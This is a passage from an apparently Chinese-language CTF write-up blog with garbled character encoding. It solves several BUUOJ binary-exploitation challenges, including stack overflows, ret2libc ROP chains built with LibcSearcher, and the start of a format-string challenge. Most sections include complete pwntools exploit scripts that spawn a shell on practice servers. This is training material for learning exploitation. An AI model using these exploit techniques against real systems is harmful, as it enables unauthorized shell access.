å°†v3æ‹·è´åˆ°sä¸Š</span></span><br></pre></td></tr></table></figure>

<p>ç®€å•è¿è¡Œä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ç¨‹åºçš„ç¡®ä¼šæŠŠè¾“å…¥ä¸­çš„<code>I</code>å…¨éƒ¨æ›¿æ¢æˆ<code>you</code></p>
<p><img src="https://i.loli.net/2020/09/07/EkemdSOlb9Jj5IM.png" alt="image.png"></p>
<p>åŒæ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæº¢å‡ºå¤§æ¦‚éœ€è¦<code>0x3c</code>ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯60ä¸ªå­—èŠ‚</p>
<p><img src="https://i.loli.net/2020/09/07/7iJUWvxtPjVlckS.png" alt="image.png"></p>
<p>æˆ‘ä»¬å¯ä»¥é€‰æ‹©ä½¿ç”¨20ä¸ª<code>I</code>ä½œä¸ºpaddingï¼Œç„¶åè¿™æ®µpaddingä¼šè¢«æ›¿æ¢æˆ30ä¸ª<code>you</code>ï¼Œåˆšå¥½60ä¸ªå­—èŠ‚ï¼Œåœ¨åé¢å†è¦†ç›–æ‰ebpä¸è¿”å›åœ°å€æ§åˆ¶ç¨‹åºè¿”å›åˆ°<code>get_flag</code>å‡½æ•°å³å¯å¾—åˆ°flag</p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">get_flag_addr = <span class="number">0x8048fd</span></span><br><span class="line">p = process(<span class="string">'./pwn1_sctf_2016'</span>)<span class="comment">#p = remote('node3.buuoj.cn',27140)</span></span><br><span class="line">payload = <span class="string">b'I'</span>*<span class="number">20</span> + p32(<span class="number">0xdeadbeef</span>) + p32(get_flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure>

<p>å‘é€payloadï¼Œå¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2020/09/07/nZcqDhPo5sFWm6X.png" alt="image.png"></p>
<blockquote>
<p>C++é€†å‘æ˜¯çœŸçš„kskjklasjdkajskdhasjdgsgdhsgdsajkqpiwourevz</p>
</blockquote>
<h1 id="0x005-ciscn-2019-n-1-overwrite"><a href="#0x005-ciscn-2019-n-1-overwrite" class="headerlink" title="0x005.ciscn_2019_n_1 - overwrite"></a>0x005.ciscn_2019_n_1 - overwrite</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/08/IlHxaAwpoKmFdJ5.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œmainä¸­è°ƒç”¨äº†funcå‡½æ•°ï¼Œç›´æ¥è¿›å»çœ‹</p>
<p><img src="https://i.loli.net/2020/09/08/RyLZ98UPXJp4jQh.png" alt="image.png"></p>
<p>å½“v2ä¸º11.28125æ—¶æˆ‘ä»¬å¯ä»¥è·å–flagï¼Œè€Œgetså‡½æ•°è¯»å…¥åˆ°v1å­˜åœ¨æº¢å‡ºç‚¹å¯ä»¥è¦†å†™æ‰v2</p>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œ<strong>æµ®ç‚¹æ•°11.28125åœ¨å†…å­˜ä¸­æ˜¯å¦‚ä½•è¡¨ç¤ºçš„å‘¢</strong></p>
<p>æˆ‘ä»¬å¯ä»¥ç›´æ¥è·³è½¬åˆ°è¿™ä¸ªæ•°æ®æ‰€å‚¨å­˜çš„åœ°æ–¹ï¼Œå‘ç°æ˜¯<code>0x41348000</code></p>
<p><img src="https://i.loli.net/2020/09/08/wvTE9Qhr18oXU6Z.png" alt="image.png"></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'ciscn_2019_n_1'</span>)<span class="comment">#p = remote('node3.buuoj.cn',27338)</span></span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x30</span><span class="number">-0xc</span>) + p64(<span class="number">0x401348000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure>

<p>å‘é€payloadï¼Œå¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2020/09/08/bQk98h4CdTyFAa5.png" alt="image.png"></p>
<h1 id="0x006-ciscn-2019-c-1-ret2csu-ret2libc"><a href="#0x006-ciscn-2019-c-1-ret2csu-ret2libc" class="headerlink" title="0x006.ciscn_2019_c_1 - ret2csu + ret2libc"></a>0x006.ciscn_2019_c_1 - ret2csu + ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/08/pAfovxLnPF3Cicu.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>åœ¨<code>encrypt()</code>å‡½æ•°ä¸­æˆ‘ä»¬å‘ç°ä½¿ç”¨äº†getsè¿›è¡Œè¯»å…¥ï¼Œå­˜åœ¨æº¢å‡ºç‚¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°è¿™ä¸ªå‡½æ•°ä¼šå¯¹æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œå¤„ç†ï¼Œå¸¸è§„çš„payloadä¼šè¢«ç»è¿‡ç¨‹åºå¥‡æ€ªçš„å¤„ç†ï¼Œç ´åæ‰æˆ‘ä»¬çš„æ•°æ®<img src="https://i.loli.net/2020/09/08/TXCd5VxRIm2Nbfy.png" alt="image.png"></p>
<p>ä¸è¿‡æˆ‘ä»¬å¯ä»¥å‘ç°è¯¥å‡½æ•°æ˜¯ä½¿ç”¨çš„<code>strlen()</code>å‡½æ•°æ¥åˆ¤æ–­è¾“å…¥çš„é•¿åº¦ï¼Œé‡åˆ°<code>&#39;\x00&#39;</code>æ—¶ä¼šç»ˆæ­¢ï¼Œè€Œ<code>gets()</code>å‡½æ•°é‡åˆ°<code>&#39;\x00&#39;</code>å¹¶ä¸ä¼šæˆªæ–­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†payloadå¼€å¤´çš„paddingçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ç½®ä¸º<code>&#39;\x00&#39;</code>ï¼Œè¿™æ ·æˆ‘ä»¬æ‰€è¾“å…¥çš„payloadå°±ä¸ä¼šè¢«ç¨‹åºæ”¹å˜</p>
<p>æ¥ä¸‹æ¥è€ƒè™‘æ„é€ ropé“¾getshellï¼ŒåŸºæœ¬ä¸Šå·²ç»æ˜¯å›ºå®šå¥—è·¯äº†ï¼Œ<strong>é¦–å…ˆç”¨<code>puts()</code>å‡½æ•°æ³„æ¼å‡º<code>puts()</code>çš„çœŸå®åœ°å€ï¼ŒåŒæ—¶ç”±äºé¢˜ç›®æ²¡æœ‰ç»™å‡ºlibcæ–‡ä»¶ï¼Œæ•…æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘ç”¨<code>LibcSearcher</code>è·å–libcï¼Œç„¶ålibcçš„åŸºå€ã€<code>/bin/sh</code>å’Œ<code>system()</code>çš„åœ°å€å°±éƒ½å‡ºæ¥äº†ï¼Œé…åˆä¸Šcsuä¸­çš„gadgetå³å¯getshell</strong></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line">offset = <span class="number">0x50</span></span><br><span class="line">enc_addr = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">retn = <span class="number">0x400c84</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'\x00'</span> + <span class="string">b'A'</span>*(offset<span class="number">-1</span>) + p64(<span class="number">0xdeafbeef</span>) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(pop_rdi) + p64(e.got[<span class="string">'puts'</span>]) + p64(e.plt[<span class="string">'puts'</span>]) + p64(enc_addr)</span><br><span class="line"><span class="comment">#p = process("./ciscn_2019_c_1")</span></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27832</span>)</span><br><span class="line">p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'Ciphertext\n\n'</span>)</span><br><span class="line">s = p.recv(<span class="number">6</span>)</span><br><span class="line">puts_addr = u64(s.ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">payload2 = <span class="string">'\x00'</span> + <span class="string">b'A'</span>*(offset<span class="number">-1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(retn) + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œæˆ‘ä»¬çš„expï¼ŒæˆåŠŸgetshell</p>
<p><img src="https://i.loli.net/2020/09/10/CL1T3UiExsyJbVP.png" alt="image.png"></p>
<blockquote>
<p>å‘ç”Ÿäº†å¾ˆå¤šå¾ˆç„å­¦çš„é—®é¢˜ï¼ˆğŸ‘ˆå…¶å®å°±æ˜¯æç²—å¿ƒå¤§æ„ç½¢leï¼‰ï¼Œå¯¼è‡´è¿™é“é¢˜è™½ç„¶æ—©å°±æœ‰äº†æ€è·¯ï¼Œä½†æ˜¯ç”¨çš„æ—¶é—´æ¯”é¢„æœŸè¦é•¿çš„å¤š</p>
<p>ä»¥åŠLibcSearcheråœ¨æœ¬åœ°æ— æ³•getshellï¼Œæ¢æˆæœ¬åœ°çš„libcå°±å¥½äº†ï¼ˆç„å­¦é—®é¢˜å˜å¤šäº†ï¼ˆ<del>å…¶å®åªæ˜¯LibcSearcheråº“ä¸å…¨â‘§</del>ï¼‰ï¼‰</p>
<p>ä»¥åŠUbuntu 18ä¸‹å¶å°”ä¼šå‘ç”Ÿæ ˆæ— æ³•å¯¹é½çš„æƒ…å†µï¼Œå¤šretnå‡ æ¬¡å°±å¥½äº†ï¼ˆç¡®ä¿¡ï¼‰</p>
</blockquote>
<h1 id="0x007-OGeek2019-babyrop-ret2libc"><a href="#0x007-OGeek2019-babyrop-ret2libc" class="headerlink" title="0x007.[OGeek2019]babyrop - ret2libc"></a>0x007.[OGeek2019]babyrop - ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/12/nqPDwE5WHeQsmzT.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼š</p>
<p><img src="https://i.loli.net/2020/09/12/51JOmdMVjsgAkWN.png" alt="image.png"></p>
<p>mainå‡½æ•°é¦–å…ˆä¼šè·å–ä¸€ä¸ªéšæœºæ•°ï¼Œä¼ å…¥<code>sub_804871F()</code>ä¸­</p>
<p><img src="https://i.loli.net/2020/09/12/Ijk8GHiOgxXWVdn.png" alt="image.png"></p>
<p>è¯¥å‡½æ•°ä¼šå°†éšæœºæ•°ä½œä¸ºå­—ç¬¦ä¸²è¾“å‡ºåˆ°sï¼Œä¹‹åè¯»å–æœ€å¤§0x20ä¸ªå­—èŠ‚çš„è¾“å…¥åˆ°v6ï¼Œç”¨<code>strlen()</code>è®¡ç®—v6é•¿åº¦å­˜åˆ°v1å¹¶ä¸sæ¯”å¯¹v1ä¸ªå­—èŠ‚ï¼Œè‹¥ä¸ç›¸åŒåˆ™ç›´æ¥é€€å‡ºç¨‹åº</p>
<p>è€ƒè™‘åˆ°<code>strlen()</code>å‡½æ•°ä»¥<code>&#39;\x00&#39;</code>å­—ç¬¦ä½œä¸ºç»“æŸæ ‡è¯†ç¬¦ï¼Œæ•…æˆ‘ä»¬åªéœ€è¦åœ¨è¾“å…¥å‰æ”¾ä¸Šä¸€ä¸ª<code>&#39;\x00&#39;</code>å³å¯é¿å¼€è¿™ä¸ªæ£€æµ‹</p>
<p>ä¹‹åä¼šå°†v5çš„æ•°å€¼è¿”å›åˆ°ä¸»å‡½æ•°å¹¶ä½œä¸ºå‚æ•°åˆç»™åˆ°<code>sub_80487D0()</code>å‡½æ•°ï¼Œç®€å•çœ‹ä¸€ä¸‹æˆ‘ä»¬ä¾¿å¯ä»¥å‘ç°è¯¥å‡½æ•°è¯»å–æœ€å¤§v5ä¸ªå­—èŠ‚çš„è¾“å…¥åˆ°<code>buf</code>ä¸­ï¼Œè€Œ<code>buf</code>è·ç¦»<code>ebp</code>åªæœ‰0xe7ä¸ªå­—èŠ‚</p>
<p><img src="https://i.loli.net/2020/09/13/1Y7qukt6NVJlDzd.png" alt="image.png"></p>
<p>ç”±äºæ²¡æœ‰å¯ä»¥ç›´æ¥getshellçš„å‡½æ•°ï¼Œæ•…è€ƒè™‘åœ¨ç¬¬ä¸€æ¬¡è¾“å…¥æ—¶å°†v5è¦†å†™ä¸º<code>0xff</code>ä»¥ä¿è¯èƒ½å¤Ÿè¯»å–çš„è¾“å…¥é•¿åº¦æœ€å¤§ï¼Œåœ¨ç¬¬äºŒæ¬¡è¾“å…¥æ—¶æ„é€ ropé“¾ä½¿ç”¨writeå‡½æ•°æ³„éœ²writeçš„åœ°å€ï¼Œå†ä½¿ç”¨libcsearcherå¾—åˆ°libcåŸºå€ä¸<code>system()</code>å’Œ<code>&quot;/bin/sh&quot;</code>å­—ç¬¦ä¸²çš„åœ°å€ï¼Œæœ€åæ„é€ ropé“¾è°ƒç”¨<code>system(&quot;/bin/sh&quot;)</code>å³å¯getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">e = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">write_plt = e.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = e.got[<span class="string">'write'</span>]</span><br><span class="line">payload1 = <span class="string">b'\x00'</span> + <span class="number">7</span>* <span class="string">b'\xff'</span></span><br><span class="line">payload2 = <span class="string">b'A'</span> * <span class="number">0xe7</span> + p32(<span class="number">0xdeadbeef</span>) + p32(write_plt) + p32(<span class="number">0x80487d0</span>) + p32(<span class="number">0x1</span>) + p32(write_got) + p32(<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn'</span>)<span class="comment">#p = remote('node3.buuoj.cn',25330)</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b'Correct\n'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b'A'</span>*<span class="number">0xe7</span> + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¯getshell</p>
<p><img src="https://i.loli.net/2020/09/13/SOvMLpHGFVaQfZb.png" alt="image.png"></p>
<h1 id="0x008-jarvisoj-level0-ret2text"><a href="#0x008-jarvisoj-level0-ret2text" class="headerlink" title="0x008.jarvisoj_level0 - ret2text"></a>0x008.jarvisoj_level0 - ret2text</h1><blockquote>
<p>å¥½å¤šé‡å¤è€ƒç‚¹çš„ç®€å•é¢˜å•Šâ€¦</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/18/utzZo2RkpGUC7Yj.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå¯ä»¥å‘ç°å­˜åœ¨ä¸€ä¸ªå¯ä»¥æº¢å‡ºçš„å‡½æ•°<code>vulnerable_function()</code>ï¼Œåªéœ€è¦<code>0x80</code>ä¸ªå­—èŠ‚å³å¯æº¢å‡º</p>
<p><img src="https://i.loli.net/2020/09/18/kFVOigZbem3U1yr.png" alt="image.png"></p>
<p>åŒæ—¶å­˜åœ¨ä¸€ä¸ªå¯ä»¥ç›´æ¥getshellçš„å‡½æ•°<code>callsystem()</code></p>
<p>ç›´æ¥æ„é€ payloadè¦†å†™è¿”å›åœ°å€åˆ°<code>callsystem()</code>å‡½æ•°å³å¯getshell</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x80</span> + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x400596</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'level0'</span>)<span class="comment">#p = remote('node3.buuoj.cn',29367)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/09/18/ykhU4DgzILKvQXG.png" alt="image.png"></p>
<h1 id="0x009-ciscn-2019-en-2-ret2csu-ret2libc"><a href="#0x009-ciscn-2019-en-2-ret2csu-ret2libc" class="headerlink" title="0x009.ciscn_2019_en_2 - ret2csu + ret2libc"></a>0x009.ciscn_2019_en_2 - ret2csu + ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/18/Fv6MeQnd4fU8Rmr.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ<del>æ„Ÿè§‰è¿™é¢˜å¥½åƒåœ¨å“ªä¸ªåœ°æ–¹åšè¿‡çš„æ ·å­</del>ï¼ˆ<del>ciscn_2019_c_1</del>ï¼‰</p>
<p>åœ¨<code>encrypt()</code>å‡½æ•°ä¸­æˆ‘ä»¬å‘ç°ä½¿ç”¨äº†getsè¿›è¡Œè¯»å…¥ï¼Œå­˜åœ¨æº¢å‡ºç‚¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°è¿™ä¸ªå‡½æ•°ä¼šå¯¹æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œå¤„ç†ï¼Œå¸¸è§„çš„payloadä¼šè¢«ç»è¿‡ç¨‹åºå¥‡æ€ªçš„å¤„ç†ï¼Œç ´åæ‰æˆ‘ä»¬çš„æ•°æ®<img src="https://i.loli.net/2020/09/08/TXCd5VxRIm2Nbfy.png" alt="image.png"></p>
<p>ä¸è¿‡æˆ‘ä»¬å¯ä»¥å‘ç°è¯¥å‡½æ•°æ˜¯ä½¿ç”¨çš„<code>strlen()</code>å‡½æ•°æ¥åˆ¤æ–­è¾“å…¥çš„é•¿åº¦ï¼Œé‡åˆ°<code>&#39;\x00&#39;</code>æ—¶ä¼šç»ˆæ­¢ï¼Œè€Œ<code>gets()</code>å‡½æ•°é‡åˆ°<code>&#39;\x00&#39;</code>å¹¶ä¸ä¼šæˆªæ–­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†payloadå¼€å¤´çš„paddingçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ç½®ä¸º<code>&#39;\x00&#39;</code>ï¼Œè¿™æ ·æˆ‘ä»¬æ‰€è¾“å…¥çš„payloadå°±ä¸ä¼šè¢«ç¨‹åºæ”¹å˜</p>
<p>æ¥ä¸‹æ¥è€ƒè™‘æ„é€ ropé“¾getshellï¼ŒåŸºæœ¬ä¸Šå·²ç»æ˜¯å›ºå®šå¥—è·¯äº†ï¼Œ<strong>é¦–å…ˆç”¨<code>puts()</code>å‡½æ•°æ³„æ¼å‡º<code>puts()</code>çš„çœŸå®åœ°å€ï¼ŒåŒæ—¶ç”±äºé¢˜ç›®æ²¡æœ‰ç»™å‡ºlibcæ–‡ä»¶ï¼Œæ•…æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘ç”¨<code>LibcSearcher</code>è·å–libcï¼Œç„¶ålibcçš„åŸºå€ã€<code>/bin/sh</code>å’Œ<code>system()</code>çš„åœ°å€å°±éƒ½å‡ºæ¥äº†ï¼Œé…åˆä¸Šcsuä¸­çš„gadgetå³å¯getshell</strong></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25348</span>)<span class="comment">#process('./ciscn_2019_en_2')</span></span><br><span class="line">e = ELF(<span class="string">'./ciscn_2019_en_2'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">main_addr = <span class="number">0x400b28</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">retn = <span class="number">0x400c84</span></span><br><span class="line">offset = <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'\x00'</span> + <span class="string">b'A'</span>*(offset<span class="number">-1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'text\n\n'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'\x00'</span> + <span class="string">b'A'</span>*(offset<span class="number">-1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(retn) +p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/09/18/7AoReBMP9Lr3Ojb.png" alt="image.png"></p>
<blockquote>
<p>éœ€è¦æ³¨æ„çš„æ˜¯Ubuntu 18æœ‰çš„æ—¶å€™ä¼šå­˜åœ¨æ ˆæ— æ³•å¯¹é½çš„æƒ…å†µï¼Œå¯ä»¥å¤šä½¿ç”¨å‡ æ¬¡<code>retn</code>çš„gadgetæ¥å¯¹å…¶æ ˆ</p>
</blockquote>
<h1 id="0x00A-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5-fmtstr"><a href="#0x00A-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5-fmtstr" class="headerlink" title="0x00A.[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 - fmtstr"></a>0x00A.[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 - fmtstr</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°å¼€äº†NXä¿æŠ¤å’Œcanary</p>
<p><img src="https://i.loli.net/2020/09/18/UyvYwOl6x1RH4hE.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼š</p>
<p><img src="https://i.loli.net/2020/09/18/ZweqQ3kByjGUmVK.png" alt="image.png"></p>
<p>è¯¥ç¨‹åºè·å–ä¸€ä¸ªéšæœºæ•°ï¼Œè¯»å…¥åˆ°<code>0x804c044</code>ä¸Šï¼Œéšåä¸¤æ¬¡è¯»å…¥ç”¨æˆ·è¾“å…¥å¹¶åˆ¤æ–­ç¬¬äºŒæ¬¡è¾“å…¥ä¸éšæœºæ•°æ˜¯å¦ç›¸åŒï¼Œç›¸åŒåˆ™å¯ä»¥è·å¾—shell</p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨<strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</strong>ï¼Œå¯ä»¥è¿›è¡Œ<strong>ä»»æ„åœ°å€è¯»ä¸ä»»æ„åœ°å€å†™</strong>ï¼Œæ•…è€ƒè™‘å°†<code>0x804c044</code>åœ°å€ä¸Šçš„éšæœºæ•°è¦†å†™ä¸ºæˆ‘ä»¬æƒ³è¦çš„å€¼ï¼Œéšåç›´æ¥è¾“å…¥æˆ‘ä»¬è¦†å†™çš„å€¼å³å¯getshell</p>
<p>åŒæ—¶æˆ‘ä»¬ç®€å•çš„è·‘ä¸€ä¸‹è¿™ä¸ªç¨‹åºå°±å¯ä»¥çŸ¥é“æ ¼å¼å­—ç¬¦ä¸²æ˜¯ä½äºæ ˆä¸Šçš„ç¬¬10ä¸ªå‚æ•°ï¼ˆâ€aaaaâ€ == 0x61616161ï¼‰</p>
<p><img src="https://i.loli.net/2020/09/18/Qiglex7ZCfsFhub.png" alt="image.png"></p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨pwntoolsä¸­çš„<code>fmtstr_payload()</code>æ¥æ¯”è¾ƒæ–¹ä¾¿åœ°æ„é€ èƒ½å¤Ÿè¿›è¡Œä»»æ„åœ°å€å†™çš„payload</p>
<blockquote>
<p>å…·ä½“ç”¨æ³•å¯ä»¥ç™¾åº¦ï¼Œè¿™é‡Œå°±ä¸å†æ‘˜æŠ„ä¸€éäº†</p>
</blockquote>
